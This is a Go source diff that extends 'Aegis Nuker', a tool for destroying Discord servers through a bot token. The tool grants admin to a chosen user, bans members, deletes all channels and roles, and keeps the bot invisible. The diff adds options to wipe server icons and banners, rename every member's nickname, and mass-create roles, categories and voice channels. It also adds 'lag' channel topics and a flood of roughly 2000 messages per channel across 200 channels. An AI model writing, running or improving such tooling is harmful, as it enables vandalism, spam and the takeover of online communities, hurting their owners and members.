@@ -5,9 +5,12 @@ import (
 	"fmt"
 	"math/rand"
 	"os"
+	"os/exec"
 	"os/signal"
+	"runtime"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -24,6 +27,9 @@ var (
 	colorCyan    = "\033[36m"
 	colorWhite   = "\033[37m"
 	colorMagenta = "\033[35m"
+
+	operationCounter int64
+	startTime        time.Time
 )
 
 func printColored(text string, colorCode string) {
@@ -31,7 +37,29 @@ func printColored(text string, colorCode string) {
 }
 
 func printColoredLine(text string, colorCode string) {
-	fmt.Println(colorCode + text + colorReset)
+	timestamp := time.Now().Format("15:04:05")
+	fmt.Println(colorCode + "[" + timestamp + "] " + text + colorReset)
+}
+
+func updateTitle() {
+	if startTime.IsZero() {
+		startTime = time.Now()
+	}
+
+	elapsed := time.Since(startTime)
+	counter := atomic.LoadInt64(&operationCounter)
+
+	title := fmt.Sprintf("Aegis Nuker v1.2.1 | Runtime: %s | Operations: %d",
+		elapsed.Round(time.Second).String(), counter)
+
+	if runtime.GOOS == "windows" {
+		exec.Command("cmd", "/C", "title", title).Run()
+	}
+}
+
+func incrementCounter() {
+	atomic.AddInt64(&operationCounter, 1)
+	updateTitle()
 }
 
 const (
@@ -76,6 +104,17 @@ func init() {
 }
 
 func main() {
+
+	startTime = time.Now()
+	updateTitle()
+
+	go func() {
+		for {
+			time.Sleep(1 * time.Second)
+			updateTitle()
+		}
+	}()
+
 	fmt.Print("\033[H\033[2J")
 	fmt.Print("\033[H\033[2J")
 
@@ -160,7 +199,6 @@ func nukeWithToken() {
 		printColoredLine(fmt.Sprintf("[+] Bot is ready! Connected to %d servers", len(ready.Guilds)), colorGreen)
 	})
 
-	// Set bot status to invisible/offline before opening connection
 	dg.UpdateGameStatus(0, "")
 	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
 		Status: "invisible",
@@ -172,7 +210,6 @@ func nukeWithToken() {
 		return
 	}
 
-	// Ensure bot stays offline after connection
 	dg.UpdateStatusComplex(discordgo.UpdateStatusData{
 		Status: "invisible",
 	})
@@ -308,9 +345,16 @@ func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options
 
 	go giveAdminToUser(s, guildID, userID)
 
-	// Change server name if enabled
 	if options.ChangeServerName {
 		go changeServerName(s, guildID, options.NewServerName)
+	}
+
+	if options.DestroyAppearance {
+		go destroyServerAppearance(s, guildID)
+	}
+
+	if options.ChangeAllNicknames {
+		go changeAllNicknames(s, guildID)
 	}
 
 	if options.BanAll {
@@ -324,6 +368,21 @@ func nukeServerWithOptions(s *discordgo.Session, guildID, userID string, options
 	go deleteAllChannels(s, guildID)
 
 	go deleteAllRoles(s, guildID)
+
+	go createMassRoles(s, guildID)
+	go renameAllEmojis(s, guildID)
+
+	if options.CreateCategories {
+		go createSpamCategories(s, guildID)
+	}
+
+	if options.CreateVoiceChannels {
+		go createSpamVoiceChannels(s, guildID)
+	}
+
+	if options.CreateNestedChaos {
+		go createNestedChaos(s, guildID)
+	}
 
 	createSpamChannels(s, guildID)
 }
@@ -372,6 +431,26 @@ func configureNukeOptions() NukeOptions {
 		}
 	}
 
+	printColored("[?] Create nested chaos (categories with channels)? (y/n): ", colorYellow)
+	chaos, _ := reader.ReadString('\n')
+	options.CreateNestedChaos = strings.TrimSpace(strings.ToLower(chaos)) == "y"
+
+	printColored("[?] Change all member nicknames? (y/n): ", colorYellow)
+	nicknames, _ := reader.ReadString('\n')
+	options.ChangeAllNicknames = strings.TrimSpace(strings.ToLower(nicknames)) == "y"
+
+	printColored("[?] Destroy server appearance (icon, banner)? (y/n): ", colorYellow)
+	appearance, _ := reader.ReadString('\n')
+	options.DestroyAppearance = strings.TrimSpace(strings.ToLower(appearance)) == "y"
+
+	printColored("[?] Create spam categories? (y/n): ", colorYellow)
+	categories, _ := reader.ReadString('\n')
+	options.CreateCategories = strings.TrimSpace(strings.ToLower(categories)) == "y"
+
+	printColored("[?] Create spam voice channels? (y/n): ", colorYellow)
+	voice, _ := reader.ReadString('\n')
+	options.CreateVoiceChannels = strings.TrimSpace(strings.ToLower(voice)) == "y"
+
 	fmt.Println()
 	printColoredLine("[*] Nuke configuration:", colorCyan)
 	if options.BanAll {
@@ -384,6 +463,21 @@ func configureNukeOptions() NukeOptions {
 	}
 	if options.ChangeServerName {
 		printColoredLine("  - Will change server name to: "+options.NewServerName, colorGreen)
+	}
+	if options.CreateNestedChaos {
+		printColoredLine("  - Will create nested chaos (categories + channels)", colorGreen)
+	}
+	if options.ChangeAllNicknames {
+		printColoredLine("  - Will change all member nicknames", colorGreen)
+	}
+	if options.DestroyAppearance {
+		printColoredLine("  - Will destroy server appearance", colorGreen)
+	}
+	if options.CreateCategories {
+		printColoredLine("  - Will create spam categories", colorGreen)
+	}
+	if options.CreateVoiceChannels {
+		printColoredLine("  - Will create spam voice channels", colorGreen)
 	}
 	fmt.Println()
 
@@ -460,6 +554,7 @@ func deleteAllChannels(s *discordgo.Session, guildID string) {
 				printColoredLine("[!] Error deleting channel: "+err.Error(), colorRed)
 			} else {
 				printColoredLine("[+] Deleted channel: "+channelName, colorGreen)
+				incrementCounter()
 			}
 
 		}(channel.ID, channel.Name)
@@ -495,6 +590,7 @@ func deleteAllRoles(s *discordgo.Session, guildID string) {
 				printColoredLine("[!] Error deleting role: "+err.Error(), colorRed)
 			} else {
 				printColoredLine("[+] Deleted role: "+roleName, colorGreen)
+				incrementCounter()
 			}
 
 		}(role.ID, role.Name)
@@ -504,21 +600,32 @@ func deleteAllRoles(s *discordgo.Session, guildID string) {
 }
 
 func createSpamChannels(s *discordgo.Session, guildID string) {
-	numChannels := 200 // Increased number
+	numChannels := 200
 	printColoredLine(fmt.Sprintf("[*] Creating %d spam channels with instant spam...", numChannels), colorCyan)
 
-	// Create channels as fast as possible without waiting
 	for i := 0; i < numChannels; i++ {
 		go func() {
 			channelName := generateRandomChannelName()
 			channel, err := s.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
 			if err != nil {
-				return // Don't log errors to keep it fast
+				return
 			}
 
 			printColoredLine("[+] Created channel: "+channelName, colorGreen)
+			incrementCounter()
 
-			// Start spamming immediately with bot messages (faster than webhooks)
+			go func(channelID string) {
+				lagDescription := generateLagDescription()
+				channelEdit := &discordgo.ChannelEdit{
+					Topic: lagDescription,
+				}
+				_, err := s.ChannelEditComplex(channelID, channelEdit)
+				if err == nil {
+					printColoredLine("[+] Set lag description for: "+channelName, colorGreen)
+					incrementCounter()
+				}
+			}(channel.ID)
+
 			go fastSpamChannel(s, channel.ID, channelName)
 		}()
 	}
@@ -526,10 +633,9 @@ func createSpamChannels(s *discordgo.Session, guildID string) {
 	printColoredLine("[+] All channels creation started!", colorGreen)
 }
 
-// fastSpamChannel spams a channel with bot messages as fast as possible
 func fastSpamChannel(s *discordgo.Session, channelID, channelName string) {
-	const totalMessages = 2000 // Messages per channel
-	const concurrent = 50      // Concurrent message senders
+	const totalMessages = 2000
+	const concurrent = 50
 
 	var wg sync.WaitGroup
 	wg.Add(concurrent)
@@ -542,13 +648,14 @@ func fastSpamChannel(s *discordgo.Session, channelID, channelName string) {
 
 			for j := 0; j < messagesPerSender; j++ {
 				message := getRandomSpamMessage()
-				s.ChannelMessageSend(channelID, message)
-				// No delays - send as fast as possible
+				_, err := s.ChannelMessageSend(channelID, message)
+				if err == nil {
+					incrementCounter()
+				}
 			}
 		}()
 	}
 
-	// Don't wait for completion
 	go func() {
 		wg.Wait()
 		printColoredLine("[+] Finished spamming channel: "+channelName, colorGreen)
